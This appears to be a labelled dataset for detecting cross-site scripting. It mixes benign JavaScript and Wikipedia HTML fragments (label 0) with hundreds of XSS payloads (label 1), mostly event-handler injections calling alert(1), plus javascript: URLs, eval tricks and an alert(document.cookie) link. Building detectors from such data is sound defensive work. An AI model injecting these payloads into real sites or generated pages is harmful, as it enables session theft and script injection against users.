+"<embed draggable=""true"" ondragend=""alert(1)"">test</embed>",1
+<big id=x tabindex=1 onbeforedeactivate=alert(1)></big><input autofocus>,1
+html: function (content) {,0
+"<a href=""javascript:x='&percnt;27-alert(1)-%27';"">xss</a>",1
+"super(slider, el, options)",0
+value: function getinstance(el) { var domelem = !!el.jquery ? el[0] : el; return domelem.m_floatingactionbutton;,0
+"<shadow onbeforecopy=""alert(1)"" contenteditable>test</shadow>",1
+<section onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></section>,1
+<textarea onbeforepaste=alert(1) autofocus></textarea>,1
+"}; } function testtooltips ( parsed, entry ) {",0
+if (getnodename(element) === 'html') {,0
+"<div role=""note"" class=""hatnote navigation-not-searchable"">main article: <a href=""/wiki/artificial_intelligence_in_healthcare"" title=""artificial intelligence in healthcare"">artificial intelligence in healthcare </a> </div>",0
+"<svg onpaste=""alert(1)"" contenteditable>test</svg>",1
+"}; const default = { interval: 5000,",0
+<* contenteditable onbeforeinput=alert(1)>test,1
+return ((iselement(element) ? element.ownerdocument : // $flowfixme[prop-missing],0
+} modifiers.foreach(function (modifier) { if (!visited.has(modifier.name)) {,0
+$(text_area_selector).each(function() {,0
+} if (positionoption) { attributeoptions.position = positionoption;,0
+"this.el.removeeventlistener('change', this._handleselectchangebound)",0
+"return checks.slice(0, _i).every(function (check) {",0
+"static _settostartofday(date) { if (datepicker._isdate(date)) date.sethours(0, 0, 0, 0); }",0
+if (!userscrollsdown && !entryislowerthanprevious) {,0
+"</span> <span class=""reference-text"">",0
+}).join(' '); } return navigator.useragent;,0
+"<img src=""jav ascript:alert('');"">",1
+"<h3 id=""p-wikibase-otherprojects-label"">",0
+const event_keydown = `keydown${event_key}`; const event_load_data_api = `load${event_key}`; const arrow_left_key = 'arrowleft';,0
+const arrow_left_key = 'arrowleft',0
+"<input onmousemove=""alert(1)"">test</input>",1
+var scrolltop = container.scrolltop,0
+"</span> <span class=""reference-text""><cite class=""citation web"">clark, jack. <a rel=""nofollow"" class=""external text"" href=""https://www.bloomberg.com/news/articles/2015-07-01/musk-backed-group-probes-risks-behind-artificial-intelligence"">""musk-backed group probes risks behind artificial intelligence"" </a>. <i>bloomberg.com </i>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20151030202356/http://www.bloomberg.com/news/articles/2015-07-01/musk-backed-group-probes-risks-behind-artificial-intelligence"">archived </a> from the original on 30 october 2015<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">30 october",0
+<script>{onerror=alert}throw 1</script>,1
+"var proposals = locations.slice(); var b = [!upward, upward]; var f = [upward, !upward];",0
+"<span onmouseleave=""alert(1)"">test</span>",1
+"<style>:target {transform: rotate(180deg);}</style><source id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></source>",1
+"<audio onkeyup=""alert(1)"" contenteditable>test</audio>",1
+return this._element.closest(selector_navbar) !== null; } _getoffset() {,0
+"<colgroup onmousedown=""alert(1)"">test</colgroup>",1
+<script onreadystatechange=alert(1)></script>,1
+<frameset onpointerup=alert(1)>xss</frameset>,1
+"<b draggable=""true"" ondragend=""alert(1)"">test</b>",1
+"<label onmouseup=""alert(1)"">test</label>",1
+<svg><meta onload=alert(1)></meta>,1
+index_js.execute(this._config.clickcallback); }); this._isappended = true;,0
+} else { ztranslation = this.options.dist * (i * 2 + tween * dir); tweenedopacity = 1 - numvisibleoffset * (i * 2 + tween * dir);,0
+<svg><noscript onload=alert(1)></noscript>,1
+"var n = .5 > f ? f * (1 + b) : f + b - f * b,",0
+} this._element.classlist.remove(class_name_show) const isanimated = this._element.classlist.contains(class_name_fade),0
+"selector = selector.replace(/#([^\s""#']+)/g, (match, id) => `#${css.escape(id)}`); } return selector;",0
+"var moveevent = attachevent(actions.move, document.documentelement, eventmove, { startcalcpoint: event.calcpoint, basesize: basesize(),",0
+} }); return handlenumber;,0
+"<style>@keyframes x{}</style><fieldset style=""animation-name:x"" onanimationend=""alert(1)""></fieldset>",1
+"<p onmousemove=""alert(1)"">test</p>",1
+"return new backdrop({ classname: class_name_backdrop, isvisible,",0
+_this62._autoscrollbound = _this62._autoscroll.bind(_this62); _this62._trackbound = _this62._track.bind(_this62); if (_this62.options.fullwidth) {,0
+"this._renderdropdown(data, val)",0
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><slot id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></slot>",1
+"<multicol oncopy=""alert(1)"" contenteditable>test</multicol>",1
+let numvisibleoffset = 1 / this.options.numvisible,0
+"_completehide(relatedtarget) { const hideevent = eventhandler.trigger(this._element, event_hide, relatedtarget) if (hideevent.defaultprevented) {",0
+}; this._element.classlist.remove(class_name_hide); // @deprecated index_js.reflow(this._element);,0
+"}"">${this.options.i18n.clear}</button>` ) .appendto(this.footer)",0
+"<form draggable=""true"" ondragleave=""alert(1)"">test</form>",1
+"<acronym oncopy=""alert(1)"" contenteditable>test</acronym>",1
+"<rp draggable=""true"" ondragenter=""alert(1)"">test</rp>",1
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><del id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></del>",1
+"eventhandler.trigger(this._element, event_hide_prevented); }); }",0
+"<ul><li><a href=""/wiki/allen_institute_for_artificial_intelligence"" class=""mw-redirect"" title=""allen institute for artificial intelligence"">allen institute for artificial intelligence </a> </li>",0
+"<tbody draggable=""true"" ondragleave=""alert(1)"">test</tbody>",1
+"<output onbeforecut=""alert(1)"" contenteditable>test</output>",1
+"<a href=# onclick=""window.open('http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//','alert(1)')"">xss</a>",1
+"key: ""updatecounter"", value: function updatecounter() { var maxlength = +this.$el.attr('data-length'),",0
+"<video><track default onload=alert(1) src=""data:text/vtt,webvtt""></video>",1
+"<table draggable=""true"" ondrag=""alert(1)"">test</table>",1
+"<a href=""#"" class=""icon icon-home""> scrapy",0
+"}) } document.queryselectorall('.carousel:not([data-bs-ride=""carousel""])')",0
+const handler = ({ target }) => {,0
+if (!chips._keydown) {,0
+"<multicol onbeforecut=""alert(1)"" contenteditable>test</multicol>",1
+"<iframe ondblclick=""alert(1)"">test</iframe>",1
+for (const anchor of targetlinks) {,0
+return; } if (index_js.iselement(content)) {,0
+"<style>@keyframes x{}</style><cite style=""animation-name:x"" onanimationend=""alert(1)""></cite>",1
+"</span> <span class=""reference-text""><cite class=""citation news"">knight, will (2017). <a rel=""nofollow"" class=""external text"" href=""https://www.technologyreview.com/s/608871/finally-a-driverless-car-with-some-common-sense/"">""boston may be famous for bad drivers, but it's the testing ground for a smarter self-driving car"" </a>. <i>mit technology review </i><span class=""reference-accessdate"">. retrieved <span class=""nowrap"">27 march",0
+this.xmovement = this.options.transitionmovement,0
+}); } // eslint-disable-next-line import/no-unused-modules const hide$1 = {,0
+if (this._popper) { this._popper.destroy() },0
+"<li id=""cite_note-embodied_ai-167""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-embodied_ai_167-0"">^ </a> </b>",0
+"<tt oncopy=""alert(1)"" contenteditable>test</tt>",1
+<dfn id=x tabindex=1 onfocus=alert(1)></dfn>,1
+return domelem.m_sidenav; } destroy() {,0
+static _handlewindowresize() { for (let i = 0; i < parallax._parallaxes.length; i++) { let parallaxinstance = parallax._parallaxes[i];,0
+"_this23.options.onshow.call(_this23, _this23.$content[0]); } });",0
+<svg><i onload=alert(1)></i>,1
+if (this._isshown || this._istransitioning) {,0
+"<td ondblclick=""alert(1)"">test</td>",1
+"<li id=""cite_note-367""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-367"">^ </a> </b>",0
+h.str(a) && (a = e(a) || a),0
+<picture onpointerout=alert(1)>xss</picture>,1
+"<ul><li><a href=""#citerefacm1998"">acm 1998 </a>, i.2.7 </li>",0
+<command id=x tabindex=1 ondeactivate=alert(1)></command><input id=y autofocus>,1
+execute(this._config.clickcallback),0
+"<bdi onmousemove=""alert(1)"">test</bdi>",1
+} _getcontent() { return this._resolvepossiblefunction(this._config.content),0
+let istop = origintop <= centery,0
+var $toast = $(e.target).closest('.toast'); var toast = $toast[0].m_toast; toast.panning = true;,0
+<slot id=x tabindex=1 onbeforedeactivate=alert(1)></slot><input autofocus>,1
+}); }; const slideevent = triggerevent(event_slide);,0
+"anim({ targets: $body[0], height: finalheight,",0
+"<li><a href=""/wiki/computational_social_science"" title=""computational social science"">computational social science </a> </li>",0
+_this20.$photocaption.remove(); } });,0
+"const showevent = eventhandler.trigger(this._element, this.constructor.eventname(event_show$2)); const shadowroot = findshadowroot(this._element); const isinthedom = (shadowroot || this._element.ownerdocument.documentelement).contains(this._element);",0
+<head onpointerleave=alert(1)>xss</head>,1
+this.focusedindex < this.dropdownel.children.length &&,0
+"var value = getvalue(el); if (value !== null) { query += encode(name, value);",0
+value: function _setcarouselheight(imageonly) { var _this65 = this; var firstslide = this.$el.find('.carousel-item.active').length ? this.$el.find('.carousel-item.active').first() : this.$el.find('.carousel-item').first();,0
+"<style>:target {transform: rotate(180deg);}</style><template id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></template>",1
+"for (const element of triggerarray) { element.classlist.toggle(class_name_collapsed, !isopen); element.setattribute('aria-expanded', isopen);",0
+return $jscomp.arrayiterator(this); } });$jscomp.initsymboliterator = function () {}; };$jscomp.arrayiterator = function (e) {,0
+<base onpointerup=alert(1)>xss</base>,1
+if ( data.hover && e.buttons ) {,0
+return this; } var comparator = isfunction(selector) ? selector : getcomparefunction(selector);,0
+<body onpageshow=alert(1)>,1
+"<del draggable=""true"" ondragleave=""alert(1)"">test</del>",1
+"<ul draggable=""true"" ondrag=""alert(1)"">test</ul>",1
+var previndex = this.index,0
+"<source onkeyup=""alert(1)"" contenteditable>test</source>",1
+return } this._isshown = false,0
+"}, { key: ""_setsliderheight"", value: function _setsliderheight() {",0
+<element id=x tabindex=1 ondeactivate=alert(1)></element><input id=y autofocus>,1
+"<style>@keyframes x{}</style><option style=""animation-name:x"" onanimationstart=""alert(1)""></option>",1
+"this._resetelementattributes(selector_fixed_content, property_padding)",0
+"}); eventhandler.on(window, event_resize$1, () => { if (this._isshown && !this._istransitioning) {",0
+"<menuitem onkeydown=""alert(1)"" contenteditable>test</menuitem>",1
+"<ol draggable=""true"" ondrag=""alert(1)"">test</ol>",1
+"setdataattribute(element, key, value) {",0
+"<div class=""thumbinner"" style=""width:222px;""><a href=""/wiki/file:particleswarmarrowsanimation.gif"" class=""image""><img alt="""" src=""//upload.wikimedia.org/wikipedia/commons/thumb/e/ec/particleswarmarrowsanimation.gif/220px-particleswarmarrowsanimation.gif"" decoding=""async"" width=""220"" height=""165"" class=""thumbimage"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/e/ec/particleswarmarrowsanimation.gif/330px-particleswarmarrowsanimation.gif 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/e/ec/particleswarmarrowsanimation.gif/440px-particleswarmarrowsanimation.gif 2x"" data-file-width=""560"" data-file-height=""420"" /> </a> <div class=""thumbcaption"">",0
+<script>'alert\x281\x29'instanceof{[symbol['hasinstance']]:eval}</script>,1
+"} function pips ( grid ) { var mode = grid.mode,",0
+"} const defaulttype = { offset: '(number|null)', // todo v6 @deprecated, keep it for backwards compatibility reasons",0
+"} each([""width"", ""height""], function (v) { var lower = v.tolowercase();",0
+} disable() { this._isenabled = false,0
+"<style>@keyframes x{}</style><dl style=""animation-name:x"" onanimationstart=""alert(1)""></dl>",1
+<dir id=x tabindex=1 onfocus=alert(1)></dir>,1
+"const clickevent = `click.dismiss${component.event_key}` const name = component.name eventhandler.on(document, clickevent, `[data-bs-dismiss=""${name}""]`, function (event) {",0
+"<picture oncopy=""alert(1)"" contenteditable>test</picture>",1
+"<spacer onmouseout=""alert(1)"">test</spacer>",1
+<kbd onpointerout=alert(1)>xss</kbd>,1
+"<listing onbeforecut=""alert(1)"" contenteditable>test</listing>",1
+"<plaintext onmousedown=""alert(1)"">test</plaintext>",1
+const event_slide = `slide${event_key$8}`,0
+"find(selector, context))",0
+"<style>:target {color: red;}</style><element id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></element>",1
+"</span>"" </a>. <i>bbc news </i>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20170126133849/http://www.bbc.co.uk/news/health-38717928"">archived </a> from the original on 26 january 2017<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">26 january",0
+} static get defaulttype() { return defaulttype;,0
+"</span>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3abook&amp;rft.genre=unknown&amp;rft.btitle=a+proposal+for+the+dartmouth+summer+research+project+on+artificial+intelligence&amp;rft.date=1955&amp;rft.aulast=mccarthy&amp;rft.aufirst=john&amp;rft.au=minsky%2c+marvin&amp;rft.au=rochester%2c+nathan&amp;rft.au=shannon%2c+claude&amp;rft_id=http%3a%2f%2fwww-formal.stanford.edu%2fjmc%2fhistory%2fdartmouth%2fdartmouth.html&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",0
+return window; } return offsetparent || getcontainingblock(element) || window;,0
+"tick.css({ left: this.options.dialradius + math.sin(radian) * radius - this.options.tickradius + 'px',",0
+"m.initializejquerywrapper(sidenav, 'sidenav', 'm_sidenav'); } })(cash, m.anime);",0
+let taptargetwavewidth = originwidth > originheight ? originwidth * 2 : originwidth * 2,0
+"const applystyles$1 = { name: 'applystyles', enabled: true,",0
+return; } if (!this.isdragged) {,0
+const event_click_data_api = `click${event_key}${data_api_key}`; const class_name_carousel = 'carousel'; const class_name_active = 'active';,0
+"eventhandler.on(this._element, event_keydown_dismiss, event => {",0
+if ('ontouchstart' in window) {,0
+setstoredtheme(theme),0
+if (!toastplacement.dataset.originalclass) {,0
+"const defaulttype$b = { interval: '(number|boolean)', keyboard: 'boolean',",0
+value: function _setupinput() { this.$input = this.$el.find('input'); if (!this.$input.length) {,0
+"<frame onclick=""alert(1)"">test</frame>",1
+"<shadow onmousedown=""alert(1)"">test</shadow>",1
+"<style>:target {color: red;}</style><article id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></article>",1
+<cite id=x tabindex=1 onbeforeactivate=alert(1)></cite>,1
+} } waves.displayeffect = function(options) {,0
+"<address onmouseout=""alert(1)"">test</address>",1
+"<div onkeydown=""alert(1)"" contenteditable>test</div>",1
+<dfn id=x tabindex=1 ondeactivate=alert(1)></dfn><input id=y autofocus>,1
+"...defaultbspopperconfig, ...index_js.execute(this._config.popperconfig, [undefined, defaultbspopperconfig]) };",0
+".on('click', this.done.bind(this))",0
+".css({ float: 'right', 'font-size': '12px',",0
+if (element.classlist.contains('disabled')) {,0
+} _initializebackdrop() { return new backdrop({,0
+package.onuse(function (api) {,0
+"<style>@keyframes x{}</style><input style=""animation-name:x"" onanimationstart=""alert(1)""></input>",1
+var heightpercent = this.originalheight / this.windowheight; this.newwidth = 0; this.newheight = 0;,0
+body: 'pickers provide a simple way to select a date or time.' }); window.index.add({,0
+static get default() { return default$5; },0
+"el.removeeventlistener('click', _this42._handleindicatorclickbound)",0
+var diff = this._wrap(this.center) - clickedindex; if (diff !== 0) { e.preventdefault();,0
+"} _applymanipulationcallback(selector, callback) { if (index_js.iselement(selector)) {",0
+"<rtc oncontextmenu=""alert(1)"">test</rtc>",1
+"if (hasclass(v, c)) { removeclass(v, c); } else {",0
+"} function setvalue ( to, handlenumber ) { if ( to === null || to === false ) {",0
+"eventhandler.on(this._element, event_focusout, event => this._oninteraction(event, false)); } _cleartimeout() {",0
+const preventoverflow$1 = {,0
+<bgsound onpointermove=alert(1)>xss</bgsound>,1
+this._animateout(); return this; },0
+this.$el.append(chipel),0
+scrollspy._elements.push(_this35),0
+return object.keys(merged).map(function (key) { return merged[key]; });,0
+"} }); document.addeventlistener('focus', function (e) {",0
+this._completehide(relatedtarget) } dispose() {,0
+"<video oncontextmenu=""alert(1)"">test</video>",1
+"<spacer onmousedown=""alert(1)"">test</spacer>",1
+const event_keydown_data_api = `keydown${event_key}${data_api_key}` const event_keyup_data_api = `keyup${event_key}${data_api_key}` const class_name_show = 'show',0
+"href: 'http://materializecss.com/feature-discovery.html',",0
+"<code onbeforecopy=""alert(1)"" contenteditable>test</code>",1
+if (!arguments.length) {,0
+"<area oncontextmenu=""alert(1)"">test</area>",1
+"<div draggable=""true"" contenteditable>drag me</div><link ondragover=alert(1) contenteditable>drop here</link>",1
+"})(window); if (typeof define === 'function' && define.amd) { define('m', [], function() {",0
+"element.classlist.toggle(class_name_collapsed, !isopen) element.setattribute('aria-expanded', isopen) }",0
+"$jscomp.defineproperty = ""function"" == typeof object.defineproperties ? object.defineproperty : function (e, r, p) {",0
+"'transition-duration': effect.duration + 'ms',",0
+} else if ((e.which === m.keys.arrow_down || e.which === m.keys.arrow_up) && this.isopen) { e.preventdefault(); var direction = e.which === m.keys.arrow_down ? 1 : -1;,0
+<ol id=x tabindex=1 onactivate=alert(1)></ol>,1
+"this.options.onselect.call(this, this.date)",0
+"<summary onbeforepaste=""alert(1)"" contenteditable>test</summary>",1
+"}); }, text: function (content) {",0
+"typeof define === 'function' && define.amd ? define(['./base-component', './dom/event-handler', './util/index'], factory) :",0
+return; } if (this._config.backdrop === 'static') {,0
+<main onpointerup=alert(1)>xss</main>,1
+"<keygen onmousemove=""alert(1)"">test</keygen>",1
+"key: ""init"", value: function init(els, options) { return _get(pushpin.__proto__ || object.getprototypeof(pushpin), ""init"", this).call(this, this, els, options);",0
+"}, rgb: function (a) { return (/^rgb/.test(a) );",0
+"<style>@keyframes slidein {}</style><meter style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></meter>",1
+return } const themeswitchertext = document.queryselector('#bd-theme-text'),0
+"<col oncut=""alert(1)"" contenteditable>test</col>",1
+"<abbr onbeforepaste=""alert(1)"" contenteditable>test</abbr>",1
+if (selectindex < 0) { return; },0
+for (var i = 0; i < this.chipsdata.length; i++) { var chipel = this._renderchip(this.chipsdata[i]); this.$el.append(chipel);,0
+"<div draggable=""true"" contenteditable>drag me</div><content ondrop=alert(1) contenteditable>drop here</content>",1
+val: function (value) {,0
+<thead onpointerout=alert(1)>xss</thead>,1
+"rendertable(opts, data, randid) { return ( '<div class=""datepicker-table-wrapper""><table cellpadding=""0"" cellspacing=""0"" class=""datepicker-table"" role=""grid"" aria-labelledby=""' +",0
+"this.$activetablink.addclass('active'); let previndex = this.index; this.index = math.max(this.$tablinks.index(tablink), 0);",0
+"datatype: 'json', success: function(data) { var sha = data.sha,",0
+"<select draggable=""true"" ondragenter=""alert(1)"">test</select>",1
+this._removeeventhandlers(); this._enablebodyscrolling(); this._overlay.parentnode.removechild(this._overlay);,0
+"this.options.onpositionchange.call(this, 'pin-top'); } }",0
+"var multiplecheckbox = this.ismultiple ? ""<label><input type=\""checkbox\"""" + disabledclass + ""\""/><span>"" + option.innerhtml + ""</span></label>"" : option.innerhtml; var liel = $('<li></li>'); var spanel = $('<span></span>');",0
+if (!object.keys(storeelementevent).length) {,0
+"_emulateanimation(callback) { executeaftertransition(callback, this._getelement(), this._config.isanimated) }",0
+if (this.isopen) { this.close(); } else {,0
+this[this.currentview] = value,0
+var minprop = axis === 'y' ? top : left,0
+"prepend: function (content) { insertcontent(this, content, true); return this;",0
+"if (scroll) { scrollparents.foreach(function (scrollparent) { scrollparent.removeeventlistener('scroll', instance.update, passive);",0
+"<li id=""cite_note-qualification_problem-104""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-qualification_problem_104-0"">^ </a> </b>",0
+"<rtc onmousemove=""alert(1)"">test</rtc>",1
+"<summary oncopy=""alert(1)"" contenteditable>test</summary>",1
+"} _createclass(autocomplete, [{ key: ""destroy"",",0
+"var $tick = $('<div class=""timepicker-tick""></div>'); if (this.options.twelvehour) { for (var i = 1; i < 13; i += 1) {",0
+"eventhandler.off(document, event_key) // guard against infinite focus loop",0
+"<nobr onpaste=""alert(1)"" contenteditable>test</nobr>",1
+"selector = hrefattribute && hrefattribute !== '#' ? hrefattribute.trim() : null; } return selector ? selector.split(',').map(sel => parseselector(sel)).join(',') : null;",0
+<acronym id=x tabindex=1 onactivate=alert(1)></acronym>,1
+this._typecheckconfig(config); return config; },0
+"<img """"""><script>alert("""")</script>""\>",1
+"api.export('m', 'client')",0
+} e.stoppropagation(); },0
+"return { stepbefore: { startvalue: this.xval[j-2], step: this.xnumsteps[j-2], higheststep: this.xhighestcompletestep[j-2] }, thisstep: { startvalue: this.xval[j-1], step: this.xnumsteps[j-1], higheststep: this.xhighestcompletestep[j-1] },",0
+"<summary onpaste=""alert(1)"" contenteditable>test</summary>",1
+"<li><a href=""/wiki/jaan_tallinn"" title=""jaan tallinn"">jaan tallinn </a> </li>",0
+</span> </a> </i>&#93; </sup> </li> </ul>,0
+"if ( handlenumbers.length > 1 ) { handlenumbers.foreach(function(handlenumber, o) { var to = checkhandleposition(proposals, handlenumber, proposals[handlenumber] + proposal, b[o], f[o]);",0
+"<style>:target {color:red;}</style><object id=x style=""transition:color 1s"" ontransitionend=alert(1)></object>",1
+} }); $('.fixed-action-btn').floatingactionbutton();,0
+"}, this.options.exitdelay)",0
+"<em draggable=""true"" ondragend=""alert(1)"">test</em>",1
+"<li><a href=""/wiki/glossary_of_genetics"" title=""glossary of genetics"">genetics </a> </li>",0
+"<style>:target {transform: rotate(180deg);}</style><menuitem id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></menuitem>",1
+<img2 onpointerup=alert(1)>xss</img2>,1
+"<svg onmousemove=""alert(1)"">test</svg>",1
+"<ul><li><a href=""/wiki/evolutionary_computation_(journal)"" title=""evolutionary computation (journal)"">evolutionary computation (journal) </a> </li> </ul>",0
+var tickradius = this.options.tickradius; var diameter = dialradius * 2; var svg = timepicker._createsvgel('svg');,0
+<html id=x tabindex=1 onfocusin=alert(1)></html>,1
+let centery = windowheight / 2,0
+jqueryevent.preventdefault(),0
+"throw new error(""nouislider: missing 'min' or 'max' in 'range'."")",0
+"<blink onmousemove=""alert(1)"">test</blink>",1
+"key: ""_updateposition"", value: function _updateposition() { var scrolled = m.getdocumentscrolltop() + this.options.offset;",0
+"if (!domcontentloadedcallbacks.length) { document.addeventlistener('domcontentloaded', () => { for (const callback of domcontentloadedcallbacks) {",0
+if (object.is(':valid') && haslength && len <= lenattr || object.is(':valid') && !haslength) {,0
+"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/commands.html"">command line tool</a></li>",0
+"const version = '5.3.8' class basecomponent extends config { constructor(element, config) {",0
+<del onblur=alert(1) tabindex=1 id=x></del><input autofocus>,1
+if (this.doneanimating) {,0
+} _iswithcontent() { return boolean(this._gettitle());,0
+"\<a onmouseover=""alert(document.cookie)""\>xxs link\</a\>",1
+<plaintext id=x tabindex=1 onbeforeactivate=alert(1)></plaintext>,1
+"<div draggable=""true"" contenteditable>drag me</div><dt ondragover=alert(1) contenteditable>drop here</dt>",1
+} else { _this53.gotodate(defdate); },0
+"}); })(cash, m.anime); ;(function ($) {",0
+"<textarea onmouseover=""alert(1)"">test</textarea>",1
+} function updateconnect ( index ) { if ( !scope_connects[index] ) {,0
+"https://portswigger-labs.net/xss/xss.php?x=%3cinput%20onfocus=%22attributes[0].value=id%2burl%2bid,new%20onfocus%22%20id=%60%20autofocus%3e",1
+_this57._inserthtmlintodom(); _this57._setupmodal(); _this57._setupvariables();,0
+"$(document).on('reset', function (e) { var formreset = $(e.target); if (formreset.is('form')) {",0
+"<textarea onmousedown=""alert(1)"">test</textarea>",1
+this.$el[0].m_parallax = undefined; } static _handlescroll() {,0
+"<ul onkeyup=""alert(1)"" contenteditable>test</ul>",1
+<b id=x tabindex=1 onbeforeactivate=alert(1)></b>,1
+"for (const [selector, text] of object.entries(this._config.content)) { this._setcontent(templatewrapper, text, selector); }",0
+<frameset onpointerleave=alert(1)>xss</frameset>,1
+"<dialog onclick=""alert(1)"">test</dialog>",1
+classes = $(this).attr('class'); $(this).html('<span>' + rgb2hex(color) + ' ' + classes + '</span>'); if (classes.indexof('darken') >= 0 || $(this).hasclass('black')) {,0
+"<multicol draggable=""true"" ondragenter=""alert(1)"">test</multicol>",1
+"<html draggable=""true"" ondragstart=""alert(1)"">test</html>",1
+static getinstance(el) { let domelem = !!el.jquery ? el[0] : el; return domelem.m_tabs;,0
+"<img src=""validimage.png"" width=""10"" height=""10"" usemap=""#xss""><map name=""xss""><area shape=""rect"" coords=""0,0,82,126"" target=""alert(1)"" href=""http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//""></map>",1
+<aside onpointerdown=alert(1)>xss</aside>,1
+"<style>@keyframes x{}</style><track style=""animation-name:x"" onanimationstart=""alert(1)""></track>",1
+"<div style=""padding:0em 0.25em""> </div><table class=""nowraplinks navbox-subgroup"" style=""border-spacing:0""><tbody><tr><th scope=""row"" class=""navbox-group"" style=""width:7.5em"">ancient </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;padding:0px"">",0
+"easing: 'easeinoutquad', complete: function (anim) { var el = anim.animatables[0].target;",0
+<script>onerror=alert;throw 1</script>,1
+"m.taptarget = taptarget; if (m.jqueryloaded) { m.initializejquerywrapper(taptarget, 'taptarget', 'm_taptarget');",0
+"<li><cite id=""citerefbrooks1991"" class=""citation encyclopaedia"">brooks, r. a. (1991). ""how to build complete creatures rather than isolated cognitive simulators"". in vanlehn, k. (ed.). <i>architectures for intelligence </i>. hillsdale, nj: lawrence erlbaum associates. pp.&#160;225–239. <a href=""/wiki/citeseerx"" title=""citeseerx"">citeseerx </a>&#160;<span class=""cs1-lock-free"" title=""freely accessible""><a rel=""nofollow"" class=""external text"" href=""//citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.52.9510"">10.1.1.52.9510 </a>",0
+<h1 onpointerenter=alert(1)>xss</h1>,1
+"<tr oncut=""alert(1)"" contenteditable>test</tr>",1
+}; } function getwindowscrollbarx(element) {,0
+"toggleclass: function (c, state) { if (state !== undefined) { return this[state ? ""addclass"" : ""removeclass""](c);",0
+this._handlechipclickbound = this._handlechipclick.bind(this); this._handleinputkeydownbound = this._handleinputkeydown.bind(this); this._handleinputfocusbound = this._handleinputfocus.bind(this);,0
+"<details onmouseup=""alert(1)"">test</details>",1
+"one: function (eventname, delegate, callback) {",0
+value: function _animateindicator(previndex) {,0
+calendar.year += math.floor(math.abs(calendar.month) / 12); calendar.month -= 12; },0
+"chips: root.queryselectorall('.chips:not(.no-autoinit)'),",0
+grunt.loadnpmtasks('grunt-rename-util'),0
+"<blink onbeforepaste=""alert(1)"" contenteditable>test</blink>",1
+} static get default() { return default$1;,0
+} this._element.classlist.remove(class_name_hide) // @deprecated reflow(this._element),0
+if (!this._isshown()) { return },0
+<th onpointerdown=alert(1)>xss</th>,1
+"<abbr oncut=""alert(1)"" contenteditable>test</abbr>",1
+_selectoption(optionel) {,0
+"} function handleentrypoint ( index, value, that ) { var percentage;",0
+"<style>@keyframes x{}</style><title style=""animation-name:x"" onanimationend=""alert(1)""></title>",1
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><article id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></article>",1
+"<style>@keyframes slidein {}</style><figure style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></figure>",1
+"<del onbeforecopy=""alert(1)"" contenteditable>test</del>",1
+easing: 'easeoutquad' }); _this40.activeindex = 0;,0
+"<image onkeypress=""alert(1)"" contenteditable>test</image>",1
+if ($currcontent.length) { $currcontent[0].style.display = 'none'; },0
+"}; this.autocomplete = m.autocomplete.init(this.$input[0], this.options.autocompleteoptions); }",0
+value: function addchip(chip) { if (!this._isvalid(chip) || this.chipsdata.length >= this.options.limit) { return;,0
+http://subdomain1.portswigger-labs.net/xss/xss.php?x=%3ciframe%20name=javascript:alert(1)%20src%3d%22https%3a%2f%2fportswigger-labs.net%2fxss%2fxss.php%3fx%3d%3cscript%3elocation=name%3c/script%3e%22%3e%3c%2fiframe%3e,1
+<tbody onfocusout=alert(1) tabindex=1 id=x></tbody><input autofocus>,1
+(() => { 'use strict' const ctx = document.getelementbyid('mychart'),0
+"return merged; }, {}); // ie11 does not support object.values return object.keys(merged).map(function (key) {",0
+"<li><a href=""/wiki/biorobotics"" title=""biorobotics"">biorobotics </a> </li>",0
+"<blockquote onmouseover=""alert(1)"">test</blockquote>",1
+const scrollsize = `scroll${capitalizeddimension}`,0
+"<meter draggable=""true"" ondragenter=""alert(1)"">test</meter>",1
+<li onpointerenter=alert(1)>xss</li>,1
+value: function _handlemouseleave() { this.ishovered = false; this.isfocused = false; // allows close of tooltip when opened by focus.,0
+"const showevent = eventhandler.trigger(this._element, event_show); if (showevent.defaultprevented) { return;",0
+"show() { const showevent = eventhandler.trigger(this._element, event_show); if (showevent.defaultprevented) {",0
+"<xmp onkeypress=""alert(1)"" contenteditable>test</xmp>",1
+this._element.classlist.add(class_name_static) this._queuecallback(() => { this._element.classlist.remove(class_name_static),0
+"ordered.push([entry[index], index]); } }",0
+<label id=x tabindex=1 onactivate=alert(1)></label>,1
+if (this.options.preventscrolling) { this._preventbodyscrolling(); },0
+import scrollbarhelper from './util/scrollbar.js' const name = 'offcanvas' const data_key = 'bs.offcanvas',0
+"} eventhandler.trigger(this._element, event_hidden) }",0
+<x v-on:click='_b.constructor`alert(1)`()'>click</x>,1
+var value = attributes[name],0
